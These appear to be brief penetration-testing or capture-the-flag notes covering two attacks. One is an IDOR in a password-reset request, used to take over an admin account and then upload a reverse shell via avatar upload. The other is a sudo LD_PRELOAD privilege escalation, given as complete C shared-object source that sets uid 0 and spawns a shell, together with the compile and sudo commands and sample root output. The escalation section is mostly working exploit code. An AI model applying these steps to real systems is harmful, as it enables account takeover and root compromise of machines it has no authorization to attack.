#### IDOR reset admin password

```
* Register new account
* sign-in with new account
* Intercept reser user with Burpsuite
* send to repeater
* Change new password and confirm with username of admin account
* sign-in with admin account
* upload revershell (avatar upload in profile section)
```

#### env_keep += LD_PRELOAD (Linux Priv Esc)

* Generate a C-program file inside /tmp directory
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```
* Then save it as shell.c inside /tmp.
* Compile the program
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

```
sudo LD_PRELOAD=/tmp/shell.so <the_binary_file_we_can_run_as_root>
# whoami
root
```
